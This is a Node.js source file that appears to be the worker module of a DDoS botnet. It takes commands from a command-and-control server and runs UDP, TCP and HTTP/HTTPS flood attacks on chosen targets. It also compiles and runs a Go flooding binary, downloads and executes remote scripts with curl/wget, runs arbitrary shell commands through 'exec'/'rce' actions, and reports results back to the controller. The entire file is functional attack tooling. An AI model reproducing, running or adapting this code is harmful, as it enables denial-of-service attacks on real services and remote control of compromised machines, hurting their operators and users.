#!/usr/bin/env node
const { execSync, spawn, exec } = require("child_process");
const fs = require("fs");
const path = require("path");
const os = require("os");

const DDoS_BIN = path.join(__dirname, "ddos", "levl7-ddoser");
const SCRIPTS_DIR = path.join(__dirname, "scripts");
let cncConfig = { cnc_host: "127.0.0.1", cnc_port: "8080", worker_id: "unknown" };

fs.mkdirSync(SCRIPTS_DIR, { recursive: true });

function log(...args) { console.log("[levl7-ddos]", ...args); }

function init(config) { cncConfig = { ...cncConfig, ...config }; }

// ─── DDoS Binary Execution ───────────────────────────────────────────
function runBinary(method, target, port, duration, concurrents) {
  if (!fs.existsSync(DDoS_BIN)) {
    log("DDoS binary not found, compiling...");
    compileBinary();
  }
  const cmd = `${DDoS_BIN} -method ${method} -target ${target} -port ${port} -time ${duration} -workers ${concurrents}`;
  log("Executing:", cmd);
  try {
    execSync(cmd, { timeout: duration * 1000 + 5000, stdio: "ignore" });
    return { ok: true };
  } catch (e) {
    return { ok: false, error: e.message };
  }
}

// ─── Node.js-Based Attacks (Fallback) ────────────────────────────────
function udpFlood(target, port, duration, concurrents) {
  const dgram = require("dgram");
  const end = Date.now() + duration * 1000;
  let sent = 0;
  for (let i = 0; i < concurrents; i++) {
    const sock = dgram.createSocket("udp4");
    const bomb = Buffer.alloc(65507, "A");
    const loop = () => {
      if (Date.now() > end) { sock.close(); return; }
      sock.send(bomb, 0, bomb.length, parseInt(port), target, () => {
        sent++;
        setImmediate(loop);
      });
    };
    loop();
  }
  return { ok: true, sent };
}

function tcpFlood(target, port, duration, concurrents) {
  const net = require("net");
  const end = Date.now() + duration * 1000;
  let sent = 0;
  for (let i = 0; i < concurrents; i++) {
    const loop = () => {
      if (Date.now() > end) return;
      const sock = new net.Socket();
      sock.connect(parseInt(port), target, () => {
        sock.write(Buffer.alloc(1024, "X"));
        sent++;
        sock.destroy();
      });
      sock.on("error", () => {});
      setImmediate(loop);
    };
    loop();
  }
  return { ok: true, sent };
}

function httpFlood(target, duration, concurrents, useTLS) {
  const proto = useTLS ? "https" : "http";
  const end = Date.now() + duration * 1000;
  let sent = 0;
  for (let i = 0; i < concurrents; i++) {
    const loop = () => {
      if (Date.now() > end) return;
      try {
        const req = require(proto).get(target, (res) => { res.resume(); sent++; });
        req.on("error", () => {});
        req.setTimeout(5000, () => req.destroy());
      } catch {}
      setImmediate(loop);
    };
    loop();
  }
  return { ok: true, sent };
}

// ─── Script Execution (Mass Upload) ──────────────────────────────────
function runScript(scriptPath, args) {
  const ext = path.extname(scriptPath);
  try {
    if (ext === ".js" || ext === ".mjs") {
      const result = execSync(`node "${scriptPath}" ${args}`, { timeout: 300000, encoding: "utf8" });
      return { ok: true, output: result };
    } else if (ext === ".py") {
      const result = execSync(`python3 "${scriptPath}" ${args}`, { timeout: 300000, encoding: "utf8" });
      return { ok: true, output: result };
    } else if (ext === ".sh") {
      const result = execSync(`bash "${scriptPath}" ${args}`, { timeout: 300000, encoding: "utf8" });
      return { ok: true, output: result };
    } else if (ext === ".go" || ext === "") {
      execSync(`chmod +x "${scriptPath}" 2>/dev/null || true`, { stdio: "ignore" });
      const result = execSync(`"${scriptPath}" ${args}`, { timeout: 300000, encoding: "utf8" });
      return { ok: true, output: result };
    }
    return { ok: false, error: "Unknown script type: " + ext };
  } catch (e) {
    return { ok: false, error: e.message };
  }
}

function downloadScript(url, name) {
  try {
    const result = execSync(`curl -sL "${url}" -o "${SCRIPTS_DIR}/${name}" 2>/dev/null || wget -q "${url}" -O "${SCRIPTS_DIR}/${name}" 2>/dev/null`, { timeout: 30000 });
    execSync(`chmod +x "${SCRIPTS_DIR}/${name}" 2>/dev/null || true`);
    log("Script downloaded:", name);
    return path.join(SCRIPTS_DIR, name);
  } catch (e) {
    log("Download failed:", e.message);
    return null;
  }
}

// ─── Compile Go DDoS Binary ──────────────────────────────────────────
function compileBinary() {
  const srcDir = path.join(__dirname, "ddos");
  if (!fs.existsSync(srcDir)) return false;
  try {
    const files = fs.readdirSync(srcDir).filter(f => f.endsWith(".go"));
    if (files.length === 0) return false;
    execSync(`cd "${srcDir}" && go build -o "${DDoS_BIN}" -ldflags="-s -w" .`, { timeout: 120000, stdio: "ignore" });
    log("DDoS binary compiled");
    return fs.existsSync(DDoS_BIN);
  } catch (e) {
    log("Compile failed:", e.message);
    return false;
  }
}

// ─── Report Result Back to CNC ───────────────────────────────────────
function reportResult(cmdId, ok, output, error) {
  try {
    const http = require("axios");
    http.post(`http://${cncConfig.cnc_host}:${cncConfig.cnc_port}/api/v1/workers/result`, {
      worker_id: cncConfig.worker_id,
      cmd_id: cmdId,
      ok: !!ok,
      output: String(output || "").slice(0, 10000),
      error: String(error || "").slice(0, 1000),
    }, { timeout: 5000 }).catch(() => {});
  } catch {}
}

// ─── Command Executor ────────────────────────────────────────────────
async function execCommand(cmd) {
  log("Executing command:", cmd.action);
  let result;

  try {
    switch (cmd.action) {
      case "attack":
        if (fs.existsSync(DDoS_BIN)) result = runBinary(cmd.method, cmd.target, cmd.port, cmd.time, cmd.concurrents);
        else if (cmd.method === "UDP") result = udpFlood(cmd.target, cmd.port, cmd.time, cmd.concurrents);
        else if (cmd.method === "TCP") result = tcpFlood(cmd.target, cmd.port, cmd.time, cmd.concurrents);
        else if (cmd.method === "HTTP") result = httpFlood(cmd.target, cmd.time, cmd.concurrents, false);
        else if (cmd.method === "HTTPS") result = httpFlood(cmd.target, cmd.time, cmd.concurrents, true);
        else result = { ok: false, error: "Unknown method: " + cmd.method };
        break;

      case "download":
        result = downloadScript(cmd.url, cmd.name);
        break;

      case "run":
        result = runScript(path.join(SCRIPTS_DIR, cmd.script), cmd.args || "");
        break;

      case "method": {
        const scriptName = cmd.script_name || cmd.method;
        const flags = cmd.flags || cmd.args || "";
        const target = cmd.target || "";
        const port = cmd.port || "";
        const time = cmd.time || 30;
        const scriptPath = path.join(SCRIPTS_DIR, scriptName);

        // Auto-download if not exists
        if (!fs.existsSync(scriptPath) && cncConfig.cnc_host) {
          const http = require("axios");
          try {
            const url = `http://${cncConfig.cnc_host}:${cncConfig.cnc_port}/scripts/${scriptName}`;
            const res = await http.get(url, { timeout: 10000, responseType: "stream" });
            const ws = fs.createWriteStream(scriptPath);
            res.data.pipe(ws);
            await new Promise((resolve, reject) => { ws.on("finish", resolve); ws.on("error", reject); });
            fs.chmodSync(scriptPath, 0o755);
            log("Auto-downloaded script:", scriptName);
          } catch (e) {
            result = { ok: false, error: `Script download failed: ${e.message}` };
            break;
          }
        }

        // Build args: target + port + time + custom flags
        let args = `${target} ${port} ${time}`;
        if (flags) args += ` ${flags}`;
        result = runScript(scriptPath, args);
        break;
      }

      case "exec":
      case "rce":
        try {
          const timeout = (cmd.timeout || 60) * 1000;
          const out = execSync(cmd.command, { timeout, encoding: "utf8", maxBuffer: 1024 * 1024 });
          result = { ok: true, output: out };
        } catch (e) {
          result = { ok: false, error: e.message, output: e.stdout ? String(e.stdout) : "" };
        }
        break;

      case "update":
        try {
          execSync(`cd "${__dirname}" && git pull 2>/dev/null || npm update`, { timeout: 60000, stdio: "ignore" });
          result = { ok: true };
        } catch (e) {
          result = { ok: false, error: e.message };
        }
        break;

      default:
        result = { ok: false, error: "Unknown action: " + cmd.action };
    }
  } catch (e) {
    result = { ok: false, error: e.message };
  }

  // Report result back
  if (cmd.cmd_id) reportResult(cmd.cmd_id, result.ok, result.output, result.error);

  return result;
}

module.exports = {
  init,
  execCommand,
  runBinary,
  runScript,
  downloadScript,
  compileBinary,
  udpFlood,
  tcpFlood,
  httpFlood,
  SCRIPTS_DIR,
};
